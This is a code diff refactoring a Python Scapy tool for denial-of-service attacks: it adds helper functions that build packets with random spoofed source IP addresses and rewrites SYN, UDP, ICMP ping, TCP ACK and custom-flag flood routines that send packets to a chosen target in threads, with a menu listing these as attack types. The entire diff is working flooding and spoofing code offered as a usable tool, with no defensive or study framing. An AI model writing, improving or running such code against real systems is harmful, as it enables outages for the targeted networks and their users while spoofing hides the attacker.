@@ -30,6 +30,11 @@ from scapy.all import IP, TCP, UDP, ICMP, Raw, send, RandShort, RandIP, conf
 # Suppress Scapy warnings
 conf.verb = 0
 
+# Default payload sizes (in bytes)
+DEFAULT_UDP_PAYLOAD_SIZE = 64
+DEFAULT_ICMP_PAYLOAD_SIZE = 56
+DEFAULT_TCP_PAYLOAD_SIZE = 64
+
 # Global variables for statistics
 packets_sent = 0
 stop_flood = False
@@ -39,6 +44,43 @@ lock = threading.Lock()
 def generate_random_ip():
     """Generate a random IP address for source spoofing."""
     return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
+
+
+def create_ip_layer(target_ip, spoof_ip):
+    """
+    Create IP layer with optional source spoofing.
+    
+    Args:
+        target_ip: Target IP address
+        spoof_ip: Whether to use random source IP
+    
+    Returns:
+        Scapy IP layer
+    """
+    if spoof_ip:
+        return IP(src=generate_random_ip(), dst=target_ip)
+    return IP(dst=target_ip)
+
+
+def create_tcp_layer(target_port, flags="S", include_ack=False):
+    """
+    Create TCP layer with specified flags.
+    
+    Args:
+        target_port: Target port number
+        flags: TCP flags string
+        include_ack: Whether to include random ACK number
+    
+    Returns:
+        Scapy TCP layer
+    """
+    src_port = random.randint(1024, 65535)
+    seq_num = random.randint(0, 2**32-1)
+    
+    if include_ack:
+        ack_num = random.randint(0, 2**32-1)
+        return TCP(sport=src_port, dport=target_port, flags=flags, seq=seq_num, ack=ack_num)
+    return TCP(sport=src_port, dport=target_port, flags=flags, seq=seq_num)
 
 
 def syn_flood(target_ip, target_port, pkt_count, pkt_size, spoof_ip, thread_id):
@@ -61,13 +103,9 @@ def syn_flood(target_ip, target_port, pkt_count, pkt_size, spoof_ip, thread_id):
         if stop_flood:
             break
         
-        src_ip = generate_random_ip() if spoof_ip else None
-        src_port = random.randint(1024, 65535)
-        
-        if src_ip:
-            pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(0, 2**32-1))
-        else:
-            pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(0, 2**32-1))
+        ip_layer = create_ip_layer(target_ip, spoof_ip)
+        tcp_layer = create_tcp_layer(target_port, flags="S")
+        pkt = ip_layer / tcp_layer
         
         if payload:
             pkt = pkt / payload
@@ -92,19 +130,15 @@ def udp_flood(target_ip, target_port, pkt_count, pkt_size, spoof_ip, thread_id):
     """
     global packets_sent, stop_flood
     
-    payload = Raw(b"U" * pkt_size) if pkt_size > 0 else Raw(b"U" * 64)
+    payload = Raw(b"U" * pkt_size) if pkt_size > 0 else Raw(b"U" * DEFAULT_UDP_PAYLOAD_SIZE)
     
     for i in range(pkt_count):
         if stop_flood:
             break
         
-        src_ip = generate_random_ip() if spoof_ip else None
+        ip_layer = create_ip_layer(target_ip, spoof_ip)
         src_port = random.randint(1024, 65535)
-        
-        if src_ip:
-            pkt = IP(src=src_ip, dst=target_ip) / UDP(sport=src_port, dport=target_port) / payload
-        else:
-            pkt = IP(dst=target_ip) / UDP(sport=src_port, dport=target_port) / payload
+        pkt = ip_layer / UDP(sport=src_port, dport=target_port) / payload
         
         send(pkt, verbose=False)
         
@@ -125,18 +159,14 @@ def icmp_flood(target_ip, pkt_count, pkt_size, spoof_ip, thread_id):
     """
     global packets_sent, stop_flood
     
-    payload = Raw(b"P" * pkt_size) if pkt_size > 0 else Raw(b"P" * 56)
+    payload = Raw(b"P" * pkt_size) if pkt_size > 0 else Raw(b"P" * DEFAULT_ICMP_PAYLOAD_SIZE)
     
     for i in range(pkt_count):
         if stop_flood:
             break
         
-        src_ip = generate_random_ip() if spoof_ip else None
-        
-        if src_ip:
-            pkt = IP(src=src_ip, dst=target_ip) / ICMP(type=8, code=0) / payload
-        else:
-            pkt = IP(dst=target_ip) / ICMP(type=8, code=0) / payload
+        ip_layer = create_ip_layer(target_ip, spoof_ip)
+        pkt = ip_layer / ICMP(type=8, code=0) / payload
         
         send(pkt, verbose=False)
         
@@ -164,13 +194,9 @@ def tcp_ack_flood(target_ip, target_port, pkt_count, pkt_size, spoof_ip, thread_
         if stop_flood:
             break
         
-        src_ip = generate_random_ip() if spoof_ip else None
-        src_port = random.randint(1024, 65535)
-        
-        if src_ip:
-            pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="A", seq=random.randint(0, 2**32-1), ack=random.randint(0, 2**32-1))
-        else:
-            pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="A", seq=random.randint(0, 2**32-1), ack=random.randint(0, 2**32-1))
+        ip_layer = create_ip_layer(target_ip, spoof_ip)
+        tcp_layer = create_tcp_layer(target_port, flags="A", include_ack=True)
+        pkt = ip_layer / tcp_layer
         
         if payload:
             pkt = pkt / payload
@@ -197,18 +223,16 @@ def custom_tcp_flood(target_ip, target_port, pkt_count, pkt_size, spoof_ip, tcp_
     global packets_sent, stop_flood
     
     payload = Raw(b"C" * pkt_size) if pkt_size > 0 else None
+    # Include ACK number if ACK flag is present
+    include_ack = "A" in tcp_flags.upper()
     
     for i in range(pkt_count):
         if stop_flood:
             break
         
-        src_ip = generate_random_ip() if spoof_ip else None
-        src_port = random.randint(1024, 65535)
-        
-        if src_ip:
-            pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags=tcp_flags, seq=random.randint(0, 2**32-1))
-        else:
-            pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags=tcp_flags, seq=random.randint(0, 2**32-1))
+        ip_layer = create_ip_layer(target_ip, spoof_ip)
+        tcp_layer = create_tcp_layer(target_port, flags=tcp_flags, include_ack=include_ack)
+        pkt = ip_layer / tcp_layer
         
         if payload:
             pkt = pkt / payload
@@ -330,13 +354,13 @@ def flood_pkt(target_ip, attack_type, pkt_count, pkt_size, target_port=80, spoof
 
 def show_attack_menu():
     """Display attack type selection menu."""
-    print("\n\033[36m Select Attack Type:")
-    print(" 1. SYN Flood      - TCP SYN packet flooding (most common)")
-    print(" 2. UDP Flood      - UDP packet flooding")
-    print(" 3. ICMP Flood     - ICMP echo request flooding (ping flood)")
-    print(" 4. TCP ACK Flood  - TCP ACK packet flooding")
-    print(" 5. Custom TCP     - Custom TCP flags combination")
-    print(" 6. Back to main menu\033[0m")
+    print("\n\033[36mSelect Attack Type:")
+    print("  1. SYN Flood      - TCP SYN packet flooding (most common)")
+    print("  2. UDP Flood      - UDP packet flooding")
+    print("  3. ICMP Flood     - ICMP echo request flooding (ping flood)")
+    print("  4. TCP ACK Flood  - TCP ACK packet flooding")
+    print("  5. Custom TCP     - Custom TCP flags combination")
+    print("  6. Back to main menu\033[0m")
 
 
 def get_valid_int(prompt, min_val=1, max_val=None, default=None):
